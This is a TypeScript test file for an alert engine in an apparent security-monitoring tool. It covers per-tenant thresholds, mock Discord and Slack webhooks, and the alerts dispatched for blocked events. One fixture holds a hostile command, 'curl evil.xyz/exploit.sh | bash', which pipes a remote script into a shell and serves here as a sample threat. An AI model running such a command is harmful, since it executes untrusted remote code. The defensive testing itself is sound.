/**
 * Tests for AlertEngine (Custom Thresholds & Multi-Channel Webhooks)
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { AlertEngine } from '../src/main/alert-engine.js';
import { AuditLogEntry } from '../src/main/sentinel.js';

test('AlertEngine: Configures custom risk thresholds and webhooks per tenant', () => {
  const config = AlertEngine.configureAlerts('tum-quantum', {
    riskThreshold: 85,
    burstThreatCount: 5,
    webhookUrls: {
      discord: 'https://discord.com/api/webhooks/mock/quantum',
      slack: 'https://hooks.slack.com/services/mock/quantum'
    }
  });

  assert.equal(config.tenantId, 'tum-quantum');
  assert.equal(config.riskThreshold, 85);
  assert.equal(config.burstThreatCount, 5);
  assert.equal(config.webhookUrls.discord, 'https://discord.com/api/webhooks/mock/quantum');

  const fetched = AlertEngine.getAlertConfig('tum-quantum');
  assert.equal(fetched.riskThreshold, 85);
});

test('AlertEngine: Evaluates benign events without triggering false alerts', async () => {
  const safeEvent: AuditLogEntry = {
    timestamp: new Date().toISOString(),
    verdict: 'ALLOW',
    threatCategory: 'BENIGN_EXECUTION',
    riskScore: 5,
    detail: 'git status',
    attribution: { reason: 'Safe command' }
  };

  const dispatches = await AlertEngine.evaluateEvent(safeEvent, 'tum-holdings');
  assert.equal(dispatches.length, 0, 'Safe event should not dispatch alerts');
});

test('AlertEngine: Dispatches high-severity alert on blocked threats', async () => {
  const maliciousEvent: AuditLogEntry = {
    timestamp: new Date().toISOString(),
    verdict: 'BLOCKED',
    threatCategory: 'REMOTE_CODE_EXECUTION_PIPE',
    riskScore: 98,
    detail: 'curl evil.xyz/exploit.sh | bash',
    attribution: { reason: 'Piped shell invocation' }
  };

  const dispatches = await AlertEngine.evaluateEvent(maliciousEvent, 'tum-holdings');
  assert.ok(dispatches.length > 0, 'Blocked critical threat should trigger alert');
  assert.equal(dispatches[0].delivered, true);
  assert.equal(dispatches[0].riskScore, 98);
  assert.match(dispatches[0].triggerReason, /THREAT INTERCEPTED/);

  // Verify recorded in dispatch history
  const history = AlertEngine.getDispatchHistory(10);
  assert.ok(history.some(h => h.triggerReason.includes('THREAT INTERCEPTED')));
});

test('AlertEngine: Test dispatch generates valid mock verification log', async () => {
  const testLog = await AlertEngine.testWebhook('tum-holdings', 'discord');
  assert.ok(testLog.dispatchId.startsWith('disp_'));
  assert.equal(testLog.channel, 'discord');
  assert.equal(testLog.delivered, true);
});
